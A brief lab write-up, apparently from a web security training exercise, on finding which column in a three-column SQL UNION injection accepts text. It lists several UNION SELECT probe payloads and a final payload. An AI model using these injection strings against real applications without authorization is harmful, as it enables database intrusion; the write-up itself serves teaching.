# Lab 4: SQL injection UNION attack, finding a column containing text

## Goal: Identify which column supports string values.

- Find Column Count: 3 columns
- Test String Compatibility:

```bash
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--  (Works = 2nd column is string)
' UNION SELECT NULL,NULL,'a'--  (Error)
```

- Final Payload
```bash
' UNION SELECT NULL,'<random_string>',NULL--
```

Key Learning
- Test each column with string values
- Only string columns can display text data
